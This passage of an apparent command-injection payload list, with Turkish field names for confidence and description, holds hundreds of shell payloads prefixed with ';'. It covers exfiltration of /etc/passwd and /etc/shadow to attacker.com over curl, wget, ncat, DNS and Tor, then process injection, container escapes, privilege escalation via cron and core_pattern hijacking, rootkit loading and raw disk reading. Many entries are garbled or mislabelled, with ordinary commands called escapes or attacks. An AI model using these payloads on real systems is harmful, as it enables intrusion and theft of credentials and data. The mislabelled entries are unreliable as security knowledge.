{"payload": "; wget -U \"$(hostname)\" http://attacker.com/collect", "guven": 0.85, "aciklama": "Wget User-Agent exfil"},
{"payload": "; curl -b \"data=$(whoami)\" http://attacker.com/collect", "guven": 0.85, "aciklama": "Cookie exfiltration"},
{"payload": "; wget --post-file=/etc/passwd http://attacker.com/upload", "guven": 0.95, "aciklama": "File upload POST"},
{"payload": "; curl -T /etc/shadow http://attacker.com/upload", "guven": 0.95, "aciklama": "File upload PUT"},
{"payload": "; lynx -dump http://attacker.com/collect?data=$(whoami)", "guven": 0.8, "aciklama": "Lynx browser exfiltration"},
{"payload": "; w3m -dump_source http://attacker.com/collect?info=$(id)", "guven": 0.8, "aciklama": "W3m browser exfiltration"},
{"payload": "; links -dump http://attacker.com/collect?host=$(hostname)", "guven": 0.8, "aciklama": "Links browser exfiltration"},
{"payload": "; elinks -dump http://attacker.com/collect?pwd=$(pwd)", "guven": 0.8, "aciklama": "Elinks browser exfiltration"},
{"payload": "; aria2c --header=\"X-Data: $(whoami)\" http://attacker.com/collect", "guven": 0.8, "aciklama": "Aria2c header exfiltration"},
{"payload": "; axel --header=\"X-Info: $(id)\" http://attacker.com/collect", "guven": 0.75, "aciklama": "Axel header exfiltration"},
{"payload": "; socat TCP:attacker.com:80 - <<<\"GET /?data=$(whoami) HTTP/1.1\\r\\nHost: attacker.com\\r\\n\\r\\n\"", "guven": 0.9, "aciklama": "Socat HTTP exfiltration"},
{"payload": "; ncat attacker.com 443 --ssl <<<$(cat /etc/passwd)", "guven": 0.9, "aciklama": "Ncat SSL exfiltration"},
{"payload": "; gnutls-cli attacker.com -p 443 <<<$(whoami)", "guven": 0.85, "aciklama": "GnuTLS client exfiltration"},
{"payload": "; s_client attacker.com 443 <<<$(id)", "guven": 0.8, "aciklama": "S_client exfiltration"},
{"payload": "; stunnel -c -d 8080 -r attacker.com:443 & echo $(whoami) | nc localhost 8080", "guven": 0.85, "aciklama": "Stunnel tunnel exfiltration"},
{"payload": "; proxytunnel -p proxy:8080 -d attacker.com:443 -a 9000 & echo $(whoami) | nc localhost 9000", "guven": 0.8, "aciklama": "Proxy tunnel exfiltration"},
{"payload": "; tor -f <(echo 'SocksPort 9050') & curl --socks5 localhost:9050 http://attacker.onion?data=$(whoami)", "guven": 0.85, "aciklama": "Tor exfiltration"},
{"payload": "; i2prouter start & curl --proxy localhost:4444 http://attacker.i2p?info=$(id)", "guven": 0.8, "aciklama": "I2P exfiltration"},
{"payload": "; echo $(whoami) | xxd -p | fold -w2 | while read h; do ping -c1 $h.attacker.com; done", "guven": 0.85, "aciklama": "Hex chunked DNS exfil"},
{"payload": "; echo $(id) | base64 | fold -w10 | nl | while read n d; do nslookup $n-$d.attacker.com; done", "guven": 0.85, "aciklama": "Base64 chunked DNS"},
{"payload": "; cat /etc/passwd | gzip | base64 | curl -d @- http://attacker.com/upload", "guven": 0.9, "aciklama": "Compressed upload"},
{"payload": "; tar czf - /etc | base64 | split -b 100 - chunk && for f in chunk*; do curl -T $f http://attacker.com/upload/$f; done", "guven": 0.9, "aciklama": "Archive split upload"},

# Process Injection ve Memory Attacks (151-200)
{"payload": "; echo 'evil_code' > /proc/self/mem", "guven": 0.95, "aciklama": "Process memory injection"},
{"payload": "; gdb -p $$ -batch -ex 'call (void*)dlopen(\"/tmp/evil.so\", 2)'", "guven": 0.95, "aciklama": "GDB library injection"},
{"payload": "; echo 'LD_PRELOAD=/tmp/evil.so' > /proc/self/environ", "guven": 0.9, "aciklama": "Environment injection"},
{"payload": "; ptrace PTRACE_POKETEXT $$ 0x$(objdump -d /bin/sh | grep ret | head -1 | cut -d: -f1)", "guven": 0.95, "aciklama": "Ptrace code injection"},
{"payload": "; /proc/self/exe < <(echo 'malicious_shellcode')", "guven": 0.9, "aciklama": "Self execution injection"},
{"payload": "; kill -USR1 $$; trap 'exec /bin/sh' USR1", "guven": 0.85, "aciklama": "Signal handler injection"},
{"payload": "; ulimit -c unlimited; kill -SEGV $$", "guven": 0.8, "aciklama": "Core dump trigger"},
{"payload": "; mmap /dev/zero && echo 'shellcode' > /proc/self/maps", "guven": 0.9, "aciklama": "Memory mapping injection"},
{"payload": "; /proc/self/fd/0 <<< 'exec(\"/bin/sh\")'", "guven": 0.85, "aciklama": "File descriptor injection"},
{"payload": "; exec 3< <(echo '/bin/sh'); /proc/self/fd/3", "guven": 0.85, "aciklama": "File descriptor exec"},
{"payload": "; echo 'system(\"/bin/sh\")' | as -64 -o /tmp/shell.o && ld /tmp/shell.o && /tmp/a.out", "guven": 0.9, "aciklama": "Runtime assembly"},
{"payload": "; python -c 'import ctypes; ctypes.CDLL(\"libc.so.6\").system(\"/bin/sh\")'", "guven": 0.95, "aciklama": "Python ctypes injection"},
{"payload": "; perl -e 'require \"syscall.ph\"; syscall(&SYS_execve, \"/bin/sh\", 0, 0)'", "guven": 0.9, "aciklama": "Perl syscall injection"},
{"payload": "; ruby -e 'require \"fiddle\"; Fiddle::Function.new(Fiddle.dlopen(nil)[\"system\"], [Fiddle::TYPE_VOIDP], Fiddle::TYPE_INT).call(\"/bin/sh\")'", "guven": 0.9, "aciklama": "Ruby fiddle injection"},
{"payload": "; node -e 'process.binding(\"spawn_sync\").spawn({file:\"/bin/sh\",args:[\"/bin/sh\"],stdio:[0,1,2]})'", "guven": 0.9, "aciklama": "Node.js binding injection"},
{"payload": "; php -r 'dl(\"../../../usr/lib/x86_64-linux-gnu/libc.so.6\"); system(\"/bin/sh\");'", "guven": 0.9, "aciklama": "PHP dl injection"},
{"payload": "; java -cp /tmp evil.class", "guven": 0.85, "aciklama": "Java class injection"},
{"payload": "; gcc -x c - <<< 'int main(){system(\"/bin/sh\");}' && ./a.out", "guven": 0.9, "aciklama": "Runtime compilation"},
{"payload": "; echo 'f(){system(\"/bin/sh\");}' | tcc -run -", "guven": 0.85, "aciklama": "TCC runtime compilation"},
{"payload": "; echo '#include<stdlib.h>\\nint main(){system(\"/bin/sh\");}' | clang -x c - && ./a.out", "guven": 0.9, "aciklama": "Clang runtime compilation"},
{"payload": "; objcopy --add-section .evil=/tmp/shellcode /bin/ls /tmp/evil_ls && /tmp/evil_ls", "guven": 0.9, "aciklama": "Binary section injection"},
{"payload": "; hexedit -s /bin/ls /tmp/evil_ls && /tmp/evil_ls", "guven": 0.85, "aciklama": "Binary hex editing"},
{"payload": "; dd if=/tmp/shellcode of=/bin/ls bs=1 seek=1000 conv=notrunc && /bin/ls", "guven": 0.9, "aciklama": "Binary patching"},
{"payload": "; patchelf --set-interpreter /tmp/evil_ld.so /bin/ls && /bin/ls", "guven": 0.9, "aciklama": "Interpreter patching"},
{"payload": "; chrpath -r /tmp/evil_lib /bin/ls && /bin/ls", "guven": 0.85, "aciklama": "RPATH manipulation"},
{"payload": "; prelink --undo /bin/ls && prelink --force /bin/ls && /bin/ls", "guven": 0.8, "aciklama": "Prelink manipulation"},
{"payload": "; elfkickers -m /bin/ls /tmp/evil_ls && /tmp/evil_ls", "guven": 0.8, "aciklama": "ELF manipulation"},
{"payload": "; upx -d /bin/ls -o /tmp/unpacked && upx /tmp/evil /tmp/packed && cp /tmp/packed /bin/ls", "guven": 0.85, "aciklama": "UPX packing injection"},
{"payload": "; gcore $$ && gdb core.$$ -batch -ex 'set {int}0x400000=0xdeadbeef' -ex 'gcore /tmp/evil.core'", "guven": 0.9, "aciklama": "Core file manipulation"},
{"payload": "; /proc/kcore | dd bs=1 skip=0x$(cat /proc/kallsyms | grep sys_call_table | cut -d' ' -f1) count=8", "guven": 0.95, "aciklama": "Kernel memory reading"},

# Advanced Filesystem Attacks (201-250)
{"payload": "; mount -t tmpfs tmpfs /tmp && echo 'evil' > /tmp/evil && /tmp/evil", "guven": 0.9, "aciklama": "Tmpfs mount injection"},
{"payload": "; mount --bind /tmp/evil /bin/ls && /bin/ls", "guven": 0.95, "aciklama": "Bind mount hijacking"},
{"payload": "; mount -o remount,exec /tmp && /tmp/evil", "guven": 0.9, "aciklama": "Remount executable"},
{"payload": "; losetup /dev/loop0 /tmp/evil.img && mount /dev/loop0 /mnt && /mnt/evil", "guven": 0.85, "aciklama": "Loop device mount"},
{"payload": "; mknod /tmp/evil c 1 3 && /tmp/evil", "guven": 0.85, "aciklama": "Character device creation"},
{"payload": "; mkfifo /tmp/pipe && echo '/bin/sh' > /tmp/pipe & cat /tmp/pipe | sh", "guven": 0.85, "aciklama": "Named pipe execution"},
{"payload": "; ln -sf /proc/self/exe /tmp/evil && /tmp/evil", "guven": 0.8, "aciklama": "Symbolic link hijacking"},
{"payload": "; hardlink /bin/sh /tmp/evil && /tmp/evil", "guven": 0.85, "aciklama": "Hard link creation"},
{"payload": "; inotifywait -m /tmp -e create --format '%f' | while read f; do /tmp/$f; done &", "guven": 0.8, "aciklama": "Inotify execution trap"},
{"payload": "; auditctl -w /tmp -p wa -k evil && tail -f /var/log/audit/audit.log | grep evil", "guven": 0.75, "aciklama": "Audit rule monitoring"},
{"payload": "; fanotify_mark /tmp FAN_OPEN_EXEC && /tmp/evil", "guven": 0.8, "aciklama": "Fanotify execution"},
{"payload": "; setfacl -m u:$(whoami):rwx /tmp/evil && /tmp/evil", "guven": 0.8, "aciklama": "ACL permission injection"},
{"payload": "; attr -s security.capability -V '\\x01\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' /tmp/evil", "guven": 0.9, "aciklama": "Capability injection"},
{"payload": "; chattr +i /tmp/evil && /tmp/evil", "guven": 0.8, "aciklama": "Immutable attribute"},
{"payload": "; lsattr /tmp/evil | grep -q i && /tmp/evil", "guven": 0.75, "aciklama": "Attribute check execution"},
{"payload": "; quotaon -u /dev/sda1 && edquota -u $(whoami)", "guven": 0.75, "aciklama": "Quota manipulation"},
{"payload": "; tune2fs -O ^has_journal /dev/sda1 && /tmp/evil", "guven": 0.8, "aciklama": "Filesystem tuning"},
{"payload": "; resize2fs /dev/sda1 && /tmp/evil", "guven": 0.75, "aciklama": "Filesystem resize"},
{"payload": "; fsck.ext4 -f /dev/sda1 && /tmp/evil", "guven": 0.8, "aciklama": "Filesystem check"},
{"payload": "; debugfs -w /dev/sda1 -R 'write /tmp/evil /bin/evil'", "guven": 0.9, "aciklama": "Debugfs write"},
{"payload": "; dumpe2fs /dev/sda1 | grep -q clean && /tmp/evil", "guven": 0.75, "aciklama": "Filesystem state check"},
{"payload": "; blkid /dev/sda1 | grep -q ext4 && /tmp/evil", "guven": 0.75, "aciklama": "Block device check"},
{"payload": "; lsblk | grep -q sda1 && /tmp/evil", "guven": 0.75, "aciklama": "Block device list check"},
{"payload": "; findmnt /tmp | grep -q tmpfs && /tmp/evil", "guven": 0.8, "aciklama": "Mount point check"},
{"payload": "; df -h | grep -q /tmp && /tmp/evil", "guven": 0.75, "aciklama": "Disk usage check"},
{"payload": "; du -sh /tmp | cut -f1 && /tmp/evil", "guven": 0.75, "aciklama": "Directory usage check"},
{"payload": "; stat -f /tmp | grep -q tmpfs && /tmp/evil", "guven": 0.8, "aciklama": "Filesystem stat check"},
{"payload": "; file -s /dev/sda1 | grep -q ext4 && /tmp/evil", "guven": 0.75, "aciklama": "Device file type check"},
{"payload": "; hexdump -C /dev/sda1 | head -1 && /tmp/evil", "guven": 0.8, "aciklama": "Raw device hexdump"},
{"payload": "; dd if=/dev/zero of=/tmp/sparse bs=1 count=0 seek=1G && /tmp/evil", "guven": 0.8, "aciklama": "Sparse file creation"},
{"payload": "; fallocate -l 1G /tmp/bigfile && /tmp/evil", "guven": 0.8, "aciklama": "File preallocation"},
{"payload": "; truncate -s 1G /tmp/bigfile && /tmp/evil", "guven": 0.8, "aciklama": "File truncation"},
{"payload": "; sync && echo 1 > /proc/sys/vm/drop_caches && /tmp/evil", "guven": 0.8, "aciklama": "Cache drop"},
{"payload": "; swapon /tmp/swapfile && /tmp/evil", "guven": 0.8, "aciklama": "Swap activation"},
{"payload": "; swapoff -a && /tmp/evil", "guven": 0.8, "aciklama": "Swap deactivation"},
{"payload": "; mkswap /tmp/swapfile && /tmp/evil", "guven": 0.8, "aciklama": "Swap creation"},
{"payload": "; sysctl vm.swappiness=100 && /tmp/evil", "guven": 0.8, "aciklama": "Swappiness tuning"},
{"payload": "; echo madvise > /sys/kernel/mm/transparent_hugepage/enabled && /tmp/evil", "guven": 0.8, "aciklama": "Hugepage tuning"},
{"payload": "; echo always > /sys/kernel/mm/transparent_hugepage/defrag && /tmp/evil", "guven": 0.8, "aciklama": "Hugepage defrag"},
{"payload": "; numactl --interleave=all /tmp/evil", "guven": 0.8, "aciklama": "NUMA policy execution"},
{"payload": "; taskset -c 0-3 /tmp/evil", "guven": 0.8, "aciklama": "CPU affinity execution"},
{"payload": "; ionice -c 1 -n 0 /tmp/evil", "guven": 0.8, "aciklama": "IO priority execution"},
{"payload": "; nice -n -20 /tmp/evil", "guven": 0.8, "aciklama": "Process priority execution"},
{"payload": "; chrt -f 99 /tmp/evil", "guven": 0.8, "aciklama": "Real-time scheduling"},
{"payload": "; cgroup_clone /tmp/evil", "guven": 0.8, "aciklama": "Cgroup clone execution"},
{"payload": "; unshare -p -f --mount-proc /tmp/evil", "guven": 0.85, "aciklama": "PID namespace execution"},
{"payload": "; unshare -n /tmp/evil", "guven": 0.85, "aciklama": "Network namespace execution"},
{"payload": "; unshare -m /tmp/evil", "guven": 0.85, "aciklama": "Mount namespace execution"},
{"payload": "; unshare -u /tmp/evil", "guven": 0.85, "aciklama": "UTS namespace execution"},
{"payload": "; unshare -i /tmp/evil", "guven": 0.85, "aciklama": "IPC namespace execution"},
{"payload": "; unshare -U /tmp/evil", "guven": 0.85, "aciklama": "User namespace execution"},

# Container Escape Techniques (251-300)
{"payload": "; docker run --privileged -v /:/host alpine chroot /host /bin/sh", "guven": 0.95, "aciklama": "Docker privileged escape"},
{"payload": "; docker run -v /var/run/docker.sock:/var/run/docker.sock alpine docker run --privileged alpine", "guven": 0.95, "aciklama": "Docker socket escape"},
{"payload": "; runc exec -t container_id /bin/sh", "guven": 0.9, "aciklama": "Runc container exec"},
{"payload": "; containerd-shim -namespace default -id evil -address /run/containerd/containerd.sock", "guven": 0.85, "aciklama": "Containerd shim escape"},
{"payload": "; ctr containers create docker.io/library/alpine:latest evil && ctr tasks start evil /bin/sh", "guven": 0.85, "aciklama": "Containerd ctr escape"},
{"payload": "; podman run --privileged -v /:/host alpine chroot /host /bin/sh", "guven": 0.9, "aciklama": "Podman privileged escape"},
{"payload": "; buildah run --privileged alpine /bin/sh", "guven": 0.85, "aciklama": "Buildah privileged run"},
{"payload": "; skopeo copy docker://alpine:latest oci:evil && runc run evil", "guven": 0.8, "aciklama": "Skopeo OCI escape"},
{"payload": "; lxc-start -n container && lxc-attach -n container /bin/sh", "guven": 0.85, "aciklama": "LXC container escape"},
{"payload": "; lxd launch alpine evil && lxc exec evil /bin/sh", "guven": 0.85, "aciklama": "LXD container escape"},
{"payload": "; systemd-nspawn -D /var/lib/machines/container /bin/sh", "guven": 0.85, "aciklama": "Systemd nspawn escape"},
{"payload": "; firejail --noprofile /bin/sh", "guven": 0.8, "aciklama": "Firejail sandbox escape"},
{"payload": "; bubblewrap --bind / / --dev-bind /dev /dev /bin/sh", "guven": 0.8, "aciklama": "Bubblewrap escape"},
{"payload": "; sandbox-exec -f /tmp/profile /bin/sh", "guven": 0.8, "aciklama": "Sandbox-exec escape"},
{"payload": "; flatpak run org.freedesktop.Platform//runtime/org.freedesktop.Platform/x86_64/stable /bin/sh", "guven": 0.8, "aciklama": "Flatpak runtime escape"},
{"payload": "; snap run --shell core", "guven": 0.8, "aciklama": "Snap shell escape"},
{"payload": "; appimage-run --appdir=/tmp/evil /bin/sh", "guven": 0.8, "aciklama": "AppImage escape"},
{"payload": "; chroot --userspec=0:0 / /bin/sh", "guven": 0.9, "aciklama": "Chroot user escape"},
{"payload": "; capsh --chroot=/ --user=root --", "guven": 0.9, "aciklama": "Capsh chroot escape"},
{"payload": "; setarch x86_64 /bin/sh", "guven": 0.75, "aciklama": "Architecture escape"},
{"payload": "; linux32 /bin/sh", "guven": 0.75, "aciklama": "32-bit emulation escape"},
{"payload": "; linux64 /bin/sh", "guven": 0.75, "aciklama": "64-bit enforcement escape"},
{"payload": "; faketime '2020-01-01' /bin/sh", "guven": 0.75, "aciklama": "Time manipulation escape"},
{"payload": "; fakeroot /bin/sh", "guven": 0.8, "aciklama": "Fakeroot escape"},
{"payload": "; proot -r / /bin/sh", "guven": 0.8, "aciklama": "Proot escape"},
{"payload": "; qemu-user-static /bin/sh", "guven": 0.8, "aciklama": "QEMU user emulation"},
{"payload": "; wine cmd.exe", "guven": 0.75, "aciklama": "Wine Windows emulation"},
{"payload": "; dosbox -c 'mount C /' -c 'C:' -c 'command.com'", "guven": 0.7, "aciklama": "DOSBox emulation"},
{"payload": "; bochs -q 'boot: disk' -q 'ata0-master: type=disk, path=\"/dev/sda\"'", "guven": 0.75, "aciklama": "Bochs emulation"},
{"payload": "; qemu-system-x86_64 -hda /dev/sda -nographic", "guven": 0.8, "aciklama": "QEMU system emulation"},
{"payload": "; virtualbox --startvm evil --type headless", "guven": 0.75, "aciklama": "VirtualBox VM escape"},
{"payload": "; vmware-vmx /tmp/evil.vmx", "guven": 0.75, "aciklama": "VMware VM escape"},
{"payload": "; xl create /tmp/evil.cfg", "guven": 0.8, "aciklama": "Xen VM creation"},
{"payload": "; virsh start evil && virsh console evil", "guven": 0.8, "aciklama": "Libvirt VM escape"},
{"payload": "; kvmtool run --disk /dev/sda --kernel /boot/vmlinuz", "guven": 0.8, "aciklama": "KVM tool escape"},
{"payload": "; crosvm run --rwdisk /dev/sda /boot/vmlinuz", "guven": 0.8, "aciklama": "CrosVM escape"},
{"payload": "; firecracker --api-sock /tmp/fc.sock --config-file /tmp/vm.json", "guven": 0.8, "aciklama": "Firecracker VM escape"},
{"payload": "; cloud-hypervisor --disk path=/dev/sda --kernel /boot/vmlinuz", "guven": 0.8, "aciklama": "Cloud Hypervisor escape"},
{"payload": "; kata-runtime run evil", "guven": 0.8, "aciklama": "Kata containers escape"},
{"payload": "; gvisor-runsc run evil", "guven": 0.8, "aciklama": "gVisor runsc escape"},
{"payload": "; rkt run --insecure-options=image docker://alpine", "guven": 0.8, "aciklama": "Rkt container escape"},
{"payload": "; garden-runc run evil", "guven": 0.75, "aciklama": "Garden runc escape"},
{"payload": "; railcar run evil", "guven": 0.75, "aciklama": "Railcar container escape"},
{"payload": "; youki run evil", "guven": 0.75, "aciklama": "Youki container escape"},
{"payload": "; crun run evil", "guven": 0.8, "aciklama": "Crun container escape"},
{"payload": "; sysbox-runc run evil", "guven": 0.8, "aciklama": "Sysbox runc escape"},
{"payload": "; wasmer run /tmp/evil.wasm", "guven": 0.75, "aciklama": "WebAssembly runtime escape"},
{"payload": "; wasmtime /tmp/evil.wasm", "guven": 0.75, "aciklama": "Wasmtime runtime escape"},
{"payload": "; lucet-runtime /tmp/evil.so", "guven": 0.75, "aciklama": "Lucet runtime escape"},
{"payload": "; node --experimental-wasm-modules /tmp/evil.wasm", "guven": 0.75, "aciklama": "Node.js WASM escape"},
{"payload": "; v8 --allow-natives-syntax /tmp/evil.js", "guven": 0.8, "aciklama": "V8 engine escape"},
{"payload": "; spidermonkey /tmp/evil.js", "guven": 0.75, "aciklama": "SpiderMonkey escape"},

# Advanced Privilege Escalation (301-350)
{"payload": "; sudo -l | grep -q NOPASSWD && sudo /bin/sh", "guven": 0.95, "aciklama": "Sudo NOPASSWD escalation"},
{"payload": "; find / -perm -4000 -exec {} \\; 2>/dev/null", "guven": 0.9, "aciklama": "SUID binary execution"},
{"payload": "; find / -perm -2000 -exec {} \\; 2>/dev/null", "guven": 0.85, "aciklama": "SGID binary execution"},
{"payload": "; getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_dac_override'", "guven": 0.9, "aciklama": "Capability search"},
{"payload": "; /usr/bin/pkexec /bin/sh", "guven": 0.9, "aciklama": "Pkexec escalation"},
{"payload": "; dbus-send --system --dest=org.freedesktop.systemd1 --type=method_call --print-reply /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager.StartUnit string:\"evil.service\" string:\"replace\"", "guven": 0.85, "aciklama": "D-Bus systemd escalation"},
{"payload": "; systemctl --user daemon-reload && systemctl --user start evil.service", "guven": 0.85, "aciklama": "User systemd escalation"},
{"payload": "; at now + 1 minute <<< '/bin/sh'", "guven": 0.8, "aciklama": "At job escalation"},
{"payload": "; echo '/bin/sh' | crontab -", "guven": 0.85, "aciklama": "Crontab escalation"},
{"payload": "; (crontab -l; echo '* * * * * /bin/sh') | crontab -", "guven": 0.85, "aciklama": "Crontab append escalation"},
{"payload": "; echo '#!/bin/sh\\n/bin/sh' > /etc/cron.d/evil && chmod +x /etc/cron.d/evil", "guven": 0.9, "aciklama": "Cron.d escalation"},
{"payload": "; echo '/bin/sh' > /etc/cron.hourly/evil && chmod +x /etc/cron.hourly/evil", "guven": 0.9, "aciklama": "Cron.hourly escalation"},
{"payload": "; logrotate -f /etc/logrotate.conf", "guven": 0.8, "aciklama": "Logrotate escalation"},
{"payload": "; anacron -f", "guven": 0.8, "aciklama": "Anacron escalation"},
{"payload": "; systemd-run --uid=0 --gid=0 /bin/sh", "guven": 0.9, "aciklama": "Systemd-run escalation"},
{"payload": "; machinectl shell root@.host /bin/sh", "guven": 0.85, "aciklama": "Machinectl escalation"},
{"payload": "; nsenter -t 1 -m -u -i -n -p /bin/sh", "guven": 0.9, "aciklama": "Nsenter escalation"},
{"payload": "; unshare -r /bin/sh", "guven": 0.85, "aciklama": "Unshare root escalation"},
{"payload": "; newuidmap $ 0 $(id -u) 1 && newgidmap $ 0 $(id -g) 1 && /bin/sh", "guven": 0.9, "aciklama": "UID/GID map escalation"},
{"payload": "; echo 0 > /proc/sys/user/max_user_namespaces && /bin/sh", "guven": 0.8, "aciklama": "Namespace limit bypass"},
{"payload": "; echo 1 > /proc/sys/kernel/unprivileged_userns_clone && /bin/sh", "guven": 0.8, "aciklama": "Unprivileged namespace"},
{"payload": "; setpriv --reuid=0 --regid=0 --clear-groups /bin/sh", "guven": 0.9, "aciklama": "Setpriv escalation"},
{"payload": "; runuser -u root /bin/sh", "guven": 0.9, "aciklama": "Runuser escalation"},
{"payload": "; sg root /bin/sh", "guven": 0.85, "aciklama": "Sg group escalation"},
{"payload": "; newgrp root", "guven": 0.85, "aciklama": "Newgrp escalation"},
{"payload": "; su -c /bin/sh", "guven": 0.9, "aciklama": "Su escalation"},
{"payload": "; su-to-root -c /bin/sh", "guven": 0.85, "aciklama": "Su-to-root escalation"},
{"payload": "; gksu /bin/sh", "guven": 0.8, "aciklama": "Gksu escalation"},
{"payload": "; gksudo /bin/sh", "guven": 0.8, "aciklama": "Gksudo escalation"},
{"payload": "; kdesu /bin/sh", "guven": 0.8, "aciklama": "Kdesu escalation"},
{"payload": "; kdesudo /bin/sh", "guven": 0.8, "aciklama": "Kdesudo escalation"},
{"payload": "; doas /bin/sh", "guven": 0.85, "aciklama": "Doas escalation"},
{"payload": "; pfexec /bin/sh", "guven": 0.8, "aciklama": "Pfexec escalation"},
{"payload": "; dzdo /bin/sh", "guven": 0.8, "aciklama": "Dzdo escalation"},
{"payload": "; calife /bin/sh", "guven": 0.8, "aciklama": "Calife escalation"},
{"payload": "; super /bin/sh", "guven": 0.8, "aciklama": "Super escalation"},
{"payload": "; seunshare -t /tmp /bin/sh", "guven": 0.8, "aciklama": "SELinux unshare"},
{"payload": "; runcon unconfined_t /bin/sh", "guven": 0.8, "aciklama": "SELinux runcon"},
{"payload": "; chcon -t admin_home_t /bin/sh && /bin/sh", "guven": 0.8, "aciklama": "SELinux chcon"},
{"payload": "; setsebool -P allow_execmem=1 && /bin/sh", "guven": 0.8, "aciklama": "SELinux boolean"},
{"payload": "; aa-exec -p unconfined /bin/sh", "guven": 0.8, "aciklama": "AppArmor exec"},
{"payload": "; aa-complain /bin/sh && /bin/sh", "guven": 0.8, "aciklama": "AppArmor complain"},
{"payload": "; systemctl disable apparmor && /bin/sh", "guven": 0.85, "aciklama": "AppArmor disable"},
{"payload": "; echo 0 > /sys/kernel/security/apparmor/profiles && /bin/sh", "guven": 0.85, "aciklama": "AppArmor profiles clear"},
{"payload": "; mount -t securityfs none /sys/kernel/security && /bin/sh", "guven": 0.8, "aciklama": "Security filesystem mount"},
{"payload": "; echo 1 > /proc/sys/kernel/modules_disabled && /bin/sh", "guven": 0.8, "aciklama": "Module loading disable"},
{"payload": "; insmod /tmp/rootkit.ko && /bin/sh", "guven": 0.95, "aciklama": "Kernel module rootkit"},
{"payload": "; modprobe evil && /bin/sh", "guven": 0.9, "aciklama": "Modprobe evil module"},
{"payload": "; rmmod security && /bin/sh", "guven": 0.85, "aciklama": "Security module removal"},
{"payload": "; echo /tmp/evil > /proc/sys/kernel/modprobe && /bin/sh", "guven": 0.9, "aciklama": "Modprobe path hijack"},
{"payload": "; echo /tmp/evil > /proc/sys/kernel/core_pattern && /bin/sh", "guven": 0.9, "aciklama": "Core pattern hijack"},
{"payload": "; echo '|/tmp/evil' > /proc/sys/kernel/core_pattern && kill -SEGV $", "guven": 0.9, "aciklama": "Core pattern pipe"},
{"payload": "; sysctl kernel.core_pattern='/tmp/evil' && /bin/sh", "guven": 0.9, "aciklama": "Sysctl core pattern"},
{"payload": "; echo 0 > /proc/sys/kernel/dmesg_restrict && /bin/sh", "guven": 0.8, "aciklama": "Dmesg unrestrict"},
{"payload": "; echo 0 > /proc/sys/kernel/kptr_restrict && /bin/sh", "guven": 0.8, "aciklama": "Kernel pointer unrestrict"},

# Steganography and Covert Channels (351-400)
{"payload": "; steghide embed -cf image.jpg -ef /etc/passwd", "guven": 0.85, "aciklama": "Steganography embedding"},
{"payload": "; outguess -d -r stego.jpg /tmp/hidden.txt", "guven": 0.8, "aciklama": "Outguess extraction"},
{"payload": "; jsteg hide cover.jpg secret.txt stego.jpg", "guven": 0.8, "aciklama": "JPEG steganography"},
{"payload": "; stegsolve -extract stego.png", "guven": 0.8, "aciklama": "Stegsolve extraction"},
{"payload": "; binwalk -e firmware.bin", "guven": 0.85, "aciklama": "Firmware extraction"},
{"payload": "; foremost -i disk.img -o output/", "guven": 0.8, "aciklama": "File carving"},
{"payload": "; scalpel -c scalpel.conf disk.img", "guven": 0.8, "aciklama": "Scalpel carving"},
{"payload": "; photorec disk.img", "guven": 0.8, "aciklama": "PhotoRec recovery"},
{"payload": "; testdisk disk.img", "guven": 0.8, "aciklama": "TestDisk recovery"},
{"payload": "; dd if=/dev/sda bs=512 skip=2048 count=1 | strings", "guven": 0.8, "aciklama": "Raw disk strings"},
{"payload": "; xxd -s +2048 -l 512 /dev/sda", "guven": 0.8, "aciklama": "Hex disk view"},
{"payload": "; hexdump -C -s 2048 -n 512 /dev/sda", "guven": 0.8, "aciklama": "Hexdump disk view"},
{"payload": "; od -tx1 -N 512 -j 2048 /dev/sda", "guven": 0.8, "aciklama": "Octal dump disk"},
{"payload": "; hd -s 2048 -n 512 /dev/sda", "guven": 0.8, "aciklama": "Hex dump canonical"},
{"payload": "; strings -a -t x /dev/sda | head -100", "guven": 0.8, "aciklama": "Disk strings offset"},
{"payload": "; grep -a -b 'password' /dev/sda", "guven": 0.85, "aciklama": "Binary grep disk"},
{"payload": "; file -s /dev/sda*", "guven": 0.8, "aciklama": "Partition file types"},
{"payload": "; fdisk -l /dev/sda", "guven": 0.8, "aciklama": "Partition table"},
{"payload": "; parted /dev/sda print", "guven": 0.8, "aciklama": "Parted partition info"},
{"payload": "; gdisk -l /dev/sda", "guven": 0.8, "aciklama": "GPT partition info"},
{"payload": "; sfdisk -l /dev/sda", "guven": 0.8, "aciklama": "Sfdisk partition info"},
{"payload": "; lsblk -f /dev/sda", "guven": 0.8, "aciklama": "Block device filesystem"},
{"payload": "; blkid /dev/sda*", "guven": 0.8, "aciklama": "Block device IDs"},
{"payload": "; wipefs /dev/sda", "guven": 0.8, "aciklama": "Filesystem signature detection"},
{"payload": "; fsarchiver savefs /tmp/backup.fsa /dev/sda1", "guven": 0.8, "aciklama": "Filesystem archiving"},
{"payload": "; partclone.ext4 -s /dev/sda1 -o /tmp/clone.img", "guven": 0.8, "aciklama": "Partition cloning"},
{"payload": "; clonezilla -save-parts /tmp/clone sda1", "guven": 0.8, "aciklama": "Clonezilla backup"},
{"payload": "; partimage save /dev/sda1 /tmp/image.gz", "guven": 0.8, "aciklama": "Partition imaging"},
{"payload": "; dcfldd if=/dev/sda of=/tmp/forensic.dd hash=md5", "guven": 0.85, "aciklama": "Forensic disk copy"},
{"payload": "; ddrescue /dev/sda /tmp/recovered.img /tmp/mapfile", "guven": 0.8, "aciklama": "Data recovery"},
{"payload": "; gddrescue -f /dev/sda /tmp/recovered.img", "guven": 0.8, "aciklama": "GNU ddrescue"},
{"payload": "; safecopy /dev/sda /tmp/safe.img", "guven": 0.8, "aciklama": "Safe copy damaged disk"},
{"payload": "; myrescue -f /dev/sda -o /tmp/rescue.img", "guven": 0.8, "aciklama": "Myrescue recovery"},
{"payload": "; recoverjpeg /dev/sda", "guven": 0.8, "aciklama": "JPEG recovery"},
{"payload": "; magicrescue -r jpeg -d /tmp/output /dev/sda", "guven": 0.8, "aciklama": "Magic rescue"},
{"payload": "; ext3grep --ls --inode=2 /dev/sda1", "guven": 0.8, "aciklama": "Ext3 file recovery"},
{"payload": "; extundelete /dev/sda1 --restore-all", "guven": 0.8, "aciklama": "Ext undelete"},
{"payload": "; ext4magic /dev/sda1 -f /etc/passwd -a $(date -d '1 hour ago' +%s)", "guven": 0.85, "aciklama": "Ext4 magic recovery"},
